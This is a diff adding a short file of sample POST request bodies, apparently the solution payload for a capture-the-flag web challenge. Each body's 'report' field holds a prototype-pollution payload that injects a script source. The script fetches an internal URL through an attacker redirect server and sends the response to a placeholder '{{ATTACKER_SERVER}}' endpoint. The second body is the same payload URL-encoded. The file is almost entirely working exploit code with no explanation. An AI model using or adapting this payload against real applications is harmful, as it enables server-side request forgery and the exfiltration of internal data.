@@ -1,0 +1,13 @@
+Sample POST request payload
+{
+    "id":"test",
+    "url":"test",
+    "report":"&constructor[prototype][src]=data:,fetch('http://127.0.0.1/check_valid_url?url=https://{{ATTACKER_SERVER}}/redirect.php?target=http://reward:5000/bounty').then(response=>response.text().then(data=>fetch(`http://{{ATTACKER_SERVER}}/receive_flag?response=${encodeURIComponent(data)}`)))"
+}
+
+report field should be url encoded
+{
+    "id":"test",
+    "url":"test",
+    "report":"&constructor[prototype][src]=data:,fetch%28%27http%3A%2F%2F127.0.0.1%2Fcheck_valid_url%3Furl%3Dhttps%3A%2F%2F{{ATTACKER_REDIRECT_SERVER}}%2Fredirect.php%3Ftarget%3Dhttp%3A%2F%2Freward%3A5000%2Fbounty%27%29.then%28response%3D%3Eresponse.text%28%29.then%28data%3D%3Efetch%28%60http%3A%2F%2F{{ATTACKER_SERVER}}%2Freceive_flag%3Fresponse%3D%24%7BencodeURIComponent%28data%29%7D%60%29%29%29"
+}
